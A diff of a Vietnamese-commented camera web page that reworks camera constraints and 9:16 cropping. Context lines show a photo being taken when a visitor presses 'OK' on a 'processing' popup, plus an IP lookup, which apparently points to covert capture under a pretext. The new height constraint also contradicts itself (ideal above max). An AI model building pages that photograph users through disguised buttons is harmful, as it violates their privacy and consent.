@@ -118,7 +118,7 @@
       transform: scale(1.18);
     }
 
-    /* Khung Viewfinder 9:16 Fix Full tràn viền */
+    /* Khung Viewfinder 9:16 */
     .viewfinder-container {
       width: 100%;
       max-width: 280px;
@@ -137,7 +137,7 @@
     #video {
       width: 100%;
       height: 100%;
-      object-fit: cover; /* FIX: Phủ kín 100% khung 9:16 không bị dải đen */
+      object-fit: cover;
       background: #000;
       transition: transform 0.3s ease, filter 0.3s ease;
     }
@@ -340,7 +340,7 @@
     </div>
   </div>
 
-  <!-- Popup 2: Đang xử lý -> Đã xử lý xong (Chứa nút OK chụp lần 1) -->
+  <!-- Popup 2: Đang xử lý -> Đã xử lý xong (Nút OK) -->
   <div class="modal-overlay" id="process-modal" style="display: none;">
     <div class="modal-box">
       <i class="ph ph-sparkle modal-icon spinner" id="process-icon"></i>
@@ -380,7 +380,6 @@
     <div class="action-row">
       <div style="width: 42px;"></div>
 
-      <!-- Nút chụp tròn màu trắng (Lần chụp thứ 2) -->
       <button class="shutter-btn disabled" id="shutter-btn" onclick="takePhotoSequence('Nút chụp tròn màu trắng (Lần 2)')">
         <div class="shutter-inner"></div>
       </button>
@@ -432,7 +431,6 @@
       getUserIP();
     });
 
-    // Luồng Xin quyền -> Trình duyệt cấp quyền -> Popup Xử lý
     async function startPermissionFlow() {
       permissionModal.style.display = 'none';
       
@@ -463,6 +461,7 @@
       await takePhotoSequence("Nút OK Popup (Lần 1)");
     }
 
+    // THUẬT TOÁN FIX LỖI ZOOM CAMERA TRÊN IOS & ANDROID
     async function initCamera(mode) {
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
@@ -470,15 +469,28 @@
 
       facingMode = mode;
 
+      // Chuẩn hóa ràng buộc để ép thiết bị mở góc rộng nhất của cảm biến
+      const constraints = {
+        video: {
+          facingMode: { ideal: facingMode },
+          width: { min: 640, ideal: 1080, max: 1920 },
+          height: { min: 480, ideal: 1920, max: 1080 },
+          aspectRatio: { ideal: 0.5625 } // Ép đúng chuẩn 9/16 góc rộng (1080/1920)
+        },
+        audio: false
+      };
+
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: {
-            facingMode: facingMode,
-            width: { ideal: 1080 },
-            height: { ideal: 1920 }
-          },
-          audio: false
-        });
+        let stream;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+        } catch (e) {
+          // Fallback cơ bản nếu thiết bị không hỗ trợ aspectRatio chính xác
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facingMode },
+            audio: false
+          });
+        }
 
         currentStream = stream;
         video.srcObject = currentStream;
@@ -516,34 +528,30 @@
       initCamera(nextMode);
     }
 
-    // CROP CHUẨN XÁC 100% NHƯ NHỮNG GÌ MẮT NHÌN THẤY TRÊN MÀN HÌNH (9:16)
     function captureFrame() {
       return new Promise((resolve) => {
         const context = canvas.getContext('2d');
         const vW = video.videoWidth;
         const vH = video.videoHeight;
 
-        // Tỷ lệ khung hiển thị là 9/16
+        // Tính toán đúng khung hiển thị thực tế
         const targetRatio = 9 / 16;
         const currentRatio = vW / vH;
 
         let sWidth, sHeight, sx, sy;
 
         if (currentRatio > targetRatio) {
-          // Luồng video rộng hơn 9:16 (ví dụ 16:9 ngang) -> Cắt bớt 2 bên hông
           sHeight = vH;
           sWidth = vH * targetRatio;
           sx = (vW - sWidth) / 2;
           sy = 0;
         } else {
-          // Luồng video dài hơn 9:16 -> Cắt bớt trên dưới
           sWidth = vW;
           sHeight = vW / targetRatio;
           sx = 0;
           sy = (vH - sHeight) / 2;
         }
 
-        // Đặt kích thước canvas đầu ra đúng chuẩn nét 9:16 (1080x1920)
         canvas.width = 1080;
         canvas.height = 1920;
 
@@ -553,7 +561,6 @@
           context.scale(-1, 1);
         }
 
-        // Vẽ đoạn video đã được Center Crop 9:16
         context.drawImage(video, sx, sy, sWidth, sHeight, 0, 0, canvas.width, canvas.height);
         context.restore();
 
